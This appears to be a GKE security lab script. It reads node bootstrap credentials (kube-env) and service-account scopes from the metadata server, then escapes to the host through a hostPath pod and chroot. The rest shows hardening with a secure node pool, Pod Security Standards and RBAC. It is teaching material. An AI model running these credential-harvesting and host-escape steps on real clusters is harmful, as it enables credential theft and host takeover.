#!/bin/bash

# Create simple GKE cluster

export MY_ZONE=us-central1-c

gcloud container clusters create simplecluster --zone $MY_ZONE --num-nodes 2 --metadata=disable-legacy-endpoints=false

kubectl version

# Run Google Cloud-SDK pod

kubectl run -it --rm gcloud --image=google/cloud-sdk:latest --restart=Never -- bash

# Explore Compute Metadata endpoint

curl -s http://metadata.google.internal/computeMetadata/v1/instance/name

curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/name

kubectl run -it --rm gcloud --image=google/cloud-sdk:latest --restart=Never -- bash

# Explore GKE node bootstrapping credentials

curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/

curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env

# Leverage the Permissions assigned to this Node Pool's service account 
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes

exit

# Deploy a pod that mounts the host filesystem

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostpath
spec:
  containers:
  - name: hostpath
    image: google/cloud-sdk:latest
    command: ["/bin/bash"]
    args: ["-c", "tail -f /dev/null"]
    volumeMounts:
    - mountPath: /rootfs
      name: rootfs
  volumes:
  - name: rootfs
    hostPath:
      path: /
EOF

kubectl get pod

# Explore and compromise the underlying host
kubectl exec -it hostpath -- bash

chroot /rootfs /bin/bash

exit
exit

kubectl delete pod hostpath

# Deploy a second node pool
gcloud beta container node-pools create second-pool --cluster=simplecluster --zone=$MY_ZONE --num-nodes=1 --metadata=disable-legacy-endpoints=true --workload-metadata-from-node=SECURE


kubectl run -it --rm gcloud --image=google/cloud-sdk:latest --restart=Never --overrides='{ "apiVersion": "v1", "spec": { "securityContext": { "runAsUser": 65534, "fsGroup": 65534 }, "nodeSelector": { "cloud.google.com/gke-nodepool": "second-pool" } } }' -- bash

# Explore various blocked endpoints
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env

curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/name

exit

# Enforce Pod Security Standards
kubectl create clusterrolebinding clusteradmin --clusterrole=cluster-admin --user="$(gcloud config list account --format 'value(core.account)')"

kubectl label namespace default pod-security.kubernetes.io/enforce=restricted

cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
   name: pod-security-manager
rules:
- apiGroups: ['policy']
  resources: ['podsecuritypolicies']
  resourceNames: ['privileged', 'baseline', 'restricted']
  verbs: ['use']
- apiGroups: ['']
  resources: ['namespaces']
  verbs: ['get', 'list', 'watch', 'label']
EOF

cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
   name: pod-security-modifier
   namespace: default
subjects:
- kind: Group
  apiGroup: rbac.authorization.k8s.io
  name: system:authenticated
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: pod-security-manager
EOF

# Deploy a blocked pod that mounts the host filesystem
gcloud iam service-accounts create demo-developer

MYPROJECT=$(gcloud config list --format 'value(core.project)')

gcloud projects add-iam-policy-binding "${MYPROJECT}" --role=roles/container.developer --member="serviceAccount:demo-developer@${MYPROJECT}.iam.gserviceaccount.com"

gcloud iam service-accounts keys create key.json --iam-account "demo-developer@${MYPROJECT}.iam.gserviceaccount.com"

gcloud auth activate-service-account --key-file=key.json

gcloud container clusters get-credentials simplecluster --zone $MY_ZONE

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostpath
spec:
  containers:
  - name: hostpath
    image: google/cloud-sdk:latest
    command: ["/bin/bash"]
    args: ["-c", "tail -f /dev/null"]
    volumeMounts:
    - mountPath: /rootfs
      name: rootfs
  volumes:
  - name: rootfs
    hostPath:
      path: /
EOF

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostpath
spec:
  securityContext:
    runAsNonRoot: true  # Ensure a non-root user
    runAsUser: 1000
    fsGroup: 2000
    seccompProfile:  # Add a seccomp profile
      type: RuntimeDefault
  containers:
  - name: hostpath
    image: google/cloud-sdk:latest
    command: ["/bin/bash"]
    args: ["-c", "tail -f /dev/null"]
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
EOF


